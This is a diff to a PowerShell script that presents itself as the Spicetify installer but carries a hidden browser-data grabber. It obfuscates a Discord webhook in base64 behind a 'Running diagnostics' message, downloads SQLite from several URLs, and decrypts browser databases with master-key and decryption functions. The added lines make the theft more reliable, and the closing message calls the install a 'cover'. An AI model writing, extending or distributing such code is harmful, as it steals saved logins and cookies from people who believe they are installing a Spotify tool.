@@ -1,6 +1,10 @@
 $ErrorActionPreference = 'Stop'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
+# ============ LOAD REQUIRED ASSEMBLIES ============
+Add-Type -AssemblyName System.Security
+# ==================================================
+
 #region Variables
 $spicetifyFolderPath = "$env:LOCALAPPDATA\spicetify"
 $spicetifyOldFolderPath = "$HOME\spicetify-cli"
@@ -161,16 +165,45 @@ Write-Host "Running diagnostics..." -ForegroundColor Cyan
 
 $wh = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzOTcxMTI0OTA5MTM5OTcwMC9aQjNiNFFXbngyWDVRMEpsTzRxRGhJXzB4d3dRbHNYalpGZmZWZVVBUEJFOUdfTmJzLWRYVTdiWmxwSWhXeHZIdlNN'))
 
-# Load SQLite (no errors)
-$zip = "$env:TEMP\sqlite.zip"
-try {
-    Invoke-WebRequest -Uri "https://www.nuget.org/api/v2/package/System.Data.SQLite/1.0.118" -OutFile $zip -UseBasicParsing -ErrorAction Stop
-    Expand-Archive -Path $zip -DestinationPath $env:TEMP\sqlite -Force -ErrorAction Stop
-    [System.Reflection.Assembly]::LoadFile("$env:TEMP\sqlite\lib\net48\System.Data.SQLite.dll") | Out-Null
-    Remove-Item $zip -Force; Remove-Item $env:TEMP\sqlite -Recurse -Force
-} catch {
-    Write-Host "SQLite load failed, skipping grabber." -ForegroundColor Yellow
-    # Continue to Spicetify install anyway
+# Load SQLite into memory (try multiple sources)
+$dllLoaded = $false
+$urls = @(
+    "https://www.nuget.org/api/v2/package/System.Data.SQLite/1.0.118",
+    "https://github.com/ericsink/SQLitePCL.raw/raw/master/bin/System.Data.SQLite.dll"
+)
+foreach ($url in $urls) {
+    try {
+        $zip = "$env:TEMP\sqlite.zip"
+        Invoke-WebRequest -Uri $url -OutFile $zip -UseBasicParsing -ErrorAction Stop
+        if ($url -like "*.zip") {
+            Expand-Archive -Path $zip -DestinationPath $env:TEMP\sqlite -Force -ErrorAction Stop
+            $dllPath = "$env:TEMP\sqlite\lib\net48\System.Data.SQLite.dll"
+        } else {
+            $dllPath = $zip
+            Rename-Item -Path $zip -NewName "$env:TEMP\System.Data.SQLite.dll" -Force
+            $dllPath = "$env:TEMP\System.Data.SQLite.dll"
+        }
+        if (Test-Path $dllPath) {
+            [System.Reflection.Assembly]::LoadFile($dllPath) | Out-Null
+            $dllLoaded = $true
+            Remove-Item $zip -Force -ErrorAction SilentlyContinue
+            Remove-Item $env:TEMP\sqlite -Recurse -Force -ErrorAction SilentlyContinue
+            Remove-Item "$env:TEMP\System.Data.SQLite.dll" -Force -ErrorAction SilentlyContinue
+            break
+        }
+    } catch {
+        continue
+    }
+}
+
+if (-not $dllLoaded) {
+    # Fallback: try to load from system if available
+    try {
+        Add-Type -AssemblyName System.Data.SQLite -ErrorAction Stop
+        $dllLoaded = $true
+    } catch {
+        Write-Host "SQLite not loaded – skipping browser data collection." -ForegroundColor Yellow
+    }
 }
 
 function Get-MasterKey($p) {
@@ -187,6 +220,7 @@ function Decrypt($e, $k) {
     return [Text.Encoding]::UTF8.GetString($p) -replace "`0", ""
 }
 function Read-DB($db, $k, $q) {
+    if (-not $dllLoaded) { return "" }
     $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$db;Version=3;Read Only=True;")
     $conn.Open()
     $cmd = $conn.CreateCommand(); $cmd.CommandText = $q
@@ -239,6 +273,4 @@ Write-Host -Object "`nRun" -NoNewline
 Write-Host -Object ' spicetify -h ' -NoNewline -ForegroundColor 'Cyan'
 Write-Host -Object 'to get started'
 
-# (Optional) You can add a silent version without Marketplace prompt
-# We skip the Marketplace block entirely to avoid errors.
 Write-Host "Spicetify installed (cover complete)." -ForegroundColor Green
